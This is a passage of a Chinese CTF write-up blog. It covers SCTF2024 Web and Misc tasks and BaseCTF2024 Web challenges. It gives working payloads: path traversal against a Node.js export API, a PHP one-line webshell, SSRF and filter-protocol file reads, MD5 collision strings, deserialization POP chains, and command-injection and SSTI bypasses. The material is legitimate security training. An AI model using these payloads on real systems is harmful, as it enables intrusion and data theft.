class="string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">                    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Login Successfully&#x27;</span>&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Errow Password!&#x27;</span>&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Error decrypting password!&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> rootpath = req.<span class="property">query</span>.<span class="property">v</span>;</span><br><span class="line">    <span class="keyword">var</span> file = req.<span class="property">query</span>.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line">    file = file.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    rootpath = rootpath.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(rootpath === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(file === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;try to find parameters HaHa&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rootpath = <span class="string">&quot;static&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, rootpath + <span class="string">&quot;/&quot;</span> + file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, fileData</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        zlib.<span class="title function_">gzip</span>(fileData, <span class="function">(<span class="params">err, compressedData</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error compressing file:&#x27;</span>, err);</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error compressing file&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> base64Data = compressedData.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(base64Data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/static/report_noway_dirsearch.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/countreport&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> user <span class="keyword">in</span> <span class="title class_">Reportcache</span>) &#123;</span><br><span class="line">        count += <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Reportcache</span>[user]).<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; count &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看当前运行用户</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">    cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://localhost:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ExP0rtApi?v&#x3D;static&amp;f&#x3D;&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;app&#x2F;handle&#x2F;index.js<br>ExP0rtApi?v&#x3D;static&amp;f&#x3D;&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;app&#x2F;handle&#x2F;child_process.js</p><p>这两个路由还可以得到源码，后面的步骤可以看各战队的wp</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="FixIt"><a href="#FixIt" class="headerlink" title="FixIt"></a>FixIt</h2><p>知识点<strong>Aztec Code</strong></p><p>html引用给的css文件</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Pixel Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span> <span class="comment">&lt;!-- 引入你的 CSS 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pixel-wrap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pixel&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pixel&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: blue;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 可以添加更多 pixel 元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后网页截图得到code ,网站扫描：<a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec">https://products.aspose.app/barcode/zh-hans/recognize/aztec</a>, 最好指定是Aztec Code</p><h2 id="速来探索SCTF星球隐藏的秘密！"><a href="#速来探索SCTF星球隐藏的秘密！" class="headerlink" title="速来探索SCTF星球隐藏的秘密！"></a>速来探索SCTF星球隐藏的秘密！</h2><p>题目描述中有听说SCTF星球的语言只由英文和数字组成哦，所以只用输入字母和数字，当输入不对的就会在下面显示Really?，手动fuzz，密码：<strong>HAHAHAy04</strong></p><p><img src="/hack3r0pium/SCTF/21.png" alt="pic"></p><p>后面调教好了，就可以出flag，可以参考战队们的wp</p><h2 id="TerraWorld"><a href="#TerraWorld" class="headerlink" title="TerraWorld"></a>TerraWorld</h2><p>当时这道题真的…，一直盯着附件中的那些图片，一帧一帧的给弄成动画，发现没用</p><p>压缩包密码可以玩游戏找到，用010看wld文件可以发现里面有两个文件，分离文件，脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2024SCTF.wld&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.split(<span class="string">b&#x27;================================================&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2024SCTF_01.wld&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">f1.write(data[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2024SCTF_02.wld&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">f2.write(data[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>然后去github下载TEdit（<a href="https://github.com/TEdit/Terraria-Map-Editor/releases%EF%BC%89">https://github.com/TEdit/Terraria-Map-Editor/releases）</a> ,然后用TEdit打开第二个wld文件得到：</p><p><img src="/hack3r0pium/SCTF/22.png" alt="pic"></p><p>赛博厨子xoe得到flag</p><p><img src="/hack3r0pium/SCTF/23.png" alt="pic"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SCTF </tag>
            
            <tag> SCTF2024 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024 Web WP</title>
      <link href="/hack3r0pium/2024/09/21/BaseCTF2024-Web-WP/"/>
      <url>/hack3r0pium/2024/09/21/BaseCTF2024-Web-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="week1-A-Dark-Room"><a href="#week1-A-Dark-Room" class="headerlink" title="[week1] A Dark Room"></a>[week1] A Dark Room</h2><p>考点:f12源代码查看<br>做题步骤 ：第一题我就想到了很简单，所以直接找源码看看，直接点击enable audio然后点击生活查看源代码得到flag</p><h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>考点:f12源代码查看</p><p>做题步骤 ：首先看到<code>file_get_contents($pen)!==&#39;Aura&#39;</code>我就立马想到data伪协议来绕过，所以构造<code>pen=data://text/plain,Aura</code>然后接下来看到<code>$challenge=$_POST[&#39;challenge&#39;];</code><br><code>if strpos($challenge,&#39;http://jasmineaura.github.io&#39;)!==0)</code><br><code>&#123;</code><br><code>die(&#39;这不是Aura的博客！&#39;);</code><br><code>&#125;</code><br><code>$blog_content=file_get_contents($challenge);</code><br><code>if(strpos($blog_content,&#39;已经收到Kengwang的礼物啦&#39;)===false)</code><br><code>&#123;</code><br><code>die(&#39;请去博客里面写下感想哦~&#39;);</code><br><code>&#125;</code><br>问了一下学长得到是ssrf考点，后面也给到了提示，这里用到@绕过，当传入的url是<code>url=http://127.0.0.1</code>，如果 我们传入的url是<code>url=http://quan9i@127.0.0.1</code>,它此时依旧会访问127.0.0.1，strpos()函数查找字符串在另一字符串中第一次出现的位置。找到了就返回true所以直接传入<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:31741</code>，因为题目本身就带有已经收到Kengwang的礼物啦这句话。<code>include($gift);</code>最后这里就是直接filter协议读取flag.php,最后的flag是base64编码过的，拿去解码就好，payload:<br><img src="/hack3r0pium/basectf/1.png" alt="pic"></p><h2 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h2><p>考点:http协议，get传参，post传参，构造cookie、User-Agent、Referer、IP</p><p>做题步骤 ：直接burpsuite抓包传对应值就行，但需要特别注意post请求需要加上<strong>Content-Type: application&#x2F;x-www-form-urlencoded</strong>，ip对应的是<strong>X-Forwarded-For</strong>，还有这里的welc%00me直接传是不行的，需要去url编码一次变成**%2500**然后浏览器会自动解码成%00，最后flag是base64加密，拿去解密就行,payload:</p><p><img src="/hack3r0pium/basectf/2.png" alt="pic"></p><h2 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h2><p>考点:isset函数，md5强弱比较绕过</p><p>做题步骤 ：首先检查这些变量是否存在<code>(isset($_GET[&#39;name&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])&amp;&amp;isset($_GET[&#39;name2&#39;])&amp;&amp;isset($_POST[&#39;password2&#39;])</code>所以要用get传参name和name2，post传password和password2，第一层<code>$name!=$password&amp;&amp;md5($name)==md5($password)</code>是&#x3D;&#x3D;,也就是弱比较绕过，意思是name和password的值不相等，但是它们的md5值相等直接数组绕过，也可以科学计数法绕过，我构造<code>name[]=1 password[]=2</code>,后面<code>$name2!==$password2&amp;&amp;md5($name2)===md5($password2)</code>是&#x3D;&#x3D;&#x3D;，强比较绕过，直接md5碰撞来绕过,<code>name2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;password2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code>,还有同样也可以数组绕过强比较</p><h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>考点:一句话木马，webshell</p><p>做题步骤 ：直接创建php文件1.php写入一句话木马 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>，上传后f12网络查看上传的文件的路径是<code>/uploads/1.php</code>，然后到<code>/uploads/1.php执行</code>执行我们的命令执行，post传入的变量是我们一句话木马的密码</p><h2 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h2><p>考点: eval()函数，命令执行</p><p>做题步骤: eval函数可以任意代码执行，我们直接命令执行<code>system(&#39;cat /flag&#39;)</code></p><h2 id="Week2-ez-ser"><a href="#Week2-ez-ser" class="headerlink" title="[Week2] ez_ser"></a>[Week2] ez_ser</h2><p>考点: php反序列化，pop链构造</p><p>做题步骤: 思路：其实我是反推的，因为得到flag的是misc里面的getflag函数，所以就一路反推。下面是正推思路，我觉得讲正着推思路比较好明白怎么反着推：web的wakeup方法反序列化时就会执行，然后echo了kw这个变量会触发tosrting方法，所以就用wakeup里的变量kw指向下一个类re，然后re的tostring里面的<code>$this-&gt;chu0-&gt;$nononono;</code>,调用不存在变量会触发get方法，所以就用chuo指向下一个类pwn，因为有个<code>$dusk = &quot;gods&quot;</code>，所以首先就要构造这个dusk&#x3D;gods，get方法里面的over会调佣getflag，所以就直接指向最后一个类misc,Pop链如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$op1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$op2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$op3</span>=<span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$op4</span>=<span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="variable">$op1</span>-&gt;kw=<span class="variable">$op2</span>;</span><br><span class="line"><span class="variable">$op2</span>-&gt;chu0=<span class="variable">$op3</span>;</span><br><span class="line"><span class="variable">$op3</span>-&gt;over=<span class="variable">$op4</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$op1</span>));</span><br></pre></td></tr></table></figure><h2 id="Week2-RCEisamazingwithspace"><a href="#Week2-RCEisamazingwithspace" class="headerlink" title="[Week2] RCEisamazingwithspace"></a>[Week2] RCEisamazingwithspace</h2><p>考点: 正则匹配，空格过滤绕过</p><p>做题步骤: \s是匹配空格的，然后绕过空格过滤就好，<code>$IFS</code>直接代替空格</p><h2 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h2><p>考点: php反序列化，pop链构造，变量访问性</p><p>做题步骤: 首先思路是这么推的，以下说的反着推的思路：找到可以实现命令执行的eval函数，所以sink是最后的一个类，那么触发sink的tostring方法是把对象当成字符串调用，所以我们就可以推到shark类的invoke方法，它把word当成字符串调用了，触发invoke方法是把对象当成函数调用，那么我们可以找到sea类的get方法，把animal也就是赋值后的sea_ani变量当成函数调用，触发get方法是调用的成员不存在，所以我们直接找到nature类中的destruct中调用了不存在的see变量，而destruct反序列化后就会被调用，所以思路就出来了，但是注意的点是word和cmd变量都是私有变量，外部不可以访问，cmd这个好解决，直接后面赋值<code>system(“ls /”);</code>就好，但是word这个变量我的处理是加上construct类用this指针指向word，然后等于new Sink();，下面是pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$op1</span>=<span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$op2</span>=<span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$op3</span>=<span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$op4</span>=<span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$op1</span>-&gt;sea=<span class="variable">$op2</span>;</span><br><span class="line"><span class="variable">$op2</span>-&gt;animal=<span class="variable">$op3</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$op1</span>));</span><br></pre></td></tr></table></figure><h2 id="Week2-一起吃豆豆"><a href="#Week2-一起吃豆豆" class="headerlink" title="[Week2] 一起吃豆豆"></a>[Week2] 一起吃豆豆</h2><p>考点: js代码审计</p><p>做题步骤: 游戏题一般都是去找js代码中的某些方法或者直接找到flag（一般！一般！一般！其他的和难的另说！），当然师傅们厉害的话可以直接通关游戏，这里我直接去源码index.php搜索function找到游戏通关的函数中的flag，再base64解密得到flag<br><img src="/hack3r0pium/basectf/3.png" alt="pic"></p><h2 id="Week2-你听不到我的声音"><a href="#Week2-你听不到我的声音" class="headerlink" title="[Week2] 你听不到我的声音"></a>[Week2] 你听不到我的声音</h2><p>考点: 命令执行，shell_exec()函数绕过</p><p>做题步骤: <code>shell_exec()</code>函数哪怕执行了命令也是没有回显的，所以把输出的内容放到其他地方不就好了，先判断方法是否可行<code>?cmd=ls / | sleep 5</code>，页面暂停了5秒，说明方法可行，<code>?cmd=ls / | tee 1.txt</code>，然后访问1.txt，同样最后<code>?cmd=cat /flag | tee 1.txt</code>再访问1.txt得到flag</p><h2 id="Week2-所以你说你懂-MD5"><a href="#Week2-所以你说你懂-MD5" class="headerlink" title="[Week2] 所以你说你懂 MD5?"></a>[Week2] 所以你说你懂 MD5?</h2><p>考点: md5强弱比较，（string）md5强弱比较，md5拓展攻击</p><p>做题步骤: 第一个强比较好做，直接数组绕过来，后面两个有string的强弱比较还是第一次见，网上搜了半天找到了绕过例子：弱比较<strong>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</strong>  强比较<strong>m1&#x3D;%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap&amp;m2&#x3D;%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</strong><br>到最下面就是md5拓展攻击，先输出一个random的md5值，然后要求name最后五个字符是admin，要求post传的md5等于将 $random 和 $name 拼接起来们的 MD5 哈希值。所以我们可以进行md5拓展攻击，使用hash-ext-attack来构造</p><p><img src="/hack3r0pium/basectf/4.png" alt="pic"></p><p>思路就是因为我们已知random的md5值， 所以我们就需要拓展admin，因为name需要最后五个字符是admin，最后出来的新hash就是md5($random,$name)也就是md5（$md5），然后name就不只是admin，是新明文，下面这样传就可以得到flag</p><p><img src="/hack3r0pium/basectf/5.png" alt="pic"></p><h2 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h2><p>考点: 脚本</p><p>做题步骤: 看到计算题我就知道要拿脚本跑了，一般脚本我都是直接gpt写和平时积累，本人只是一个脚本小子，官方脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;YOUR_URL&quot;</span></span><br><span class="line">answer = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = req.post(url , data=&#123;<span class="string">&quot;answer&quot;</span>: answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;BaseCTF&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    regex = <span class="string">r&quot; (\d*?)(.)(\d*)\?&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(regex, response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) + <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) - <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;×&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) * <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;÷&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) // <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h2 id="Week3-ez-php-jail"><a href="#Week3-ez-php-jail" class="headerlink" title="[Week3] ez_php_jail"></a>[Week3] ez_php_jail</h2><p>考点: php变量，highlight_file函数，glob协议</p><p>做题步骤: 首先可以看到Jail_by.Happy，这里是php版本小于8时，变量中的.会变为_，但是我们这样<code>Jail[by.Happy</code>传就绕过了,然后看完下面函数的代码和最终利用的点，我先看了一下<code>phpinfo();</code>可以看到禁用了很多函数，最后使用highlight_file函数和glob协议解决，用highlight_file可以读取文件，然后glob是php内置函数，用于搜索特定模式的文件路径，我们使用<code>highlight_file(glob(&quot;/f*&quot;)[0]);</code>来得到flag，因为&#x2F;f*可以搜索所有以f开头的文件,[0]返回第一个元素，也就是flag的字符串</p><h2 id="Week3-复读机"><a href="#Week3-复读机" class="headerlink" title="[Week3] 复读机"></a>[Week3] 复读机</h2><p>考点: ssti，ssti过滤绕过</p><p>做题步骤: Ssti的绕过一个一个试，慢慢试-_-,最后面的&#x2F;绕过第一次做，用到的绕过方法是<code>cat (expr substr $PATH 1 1)flag</code>，也就是使用expr函数截取path环境变量的第一个字符，也就是我们的&#x2F;，网上找资料补的，也问了几个师傅，感谢你们，payload如下</p><p><img 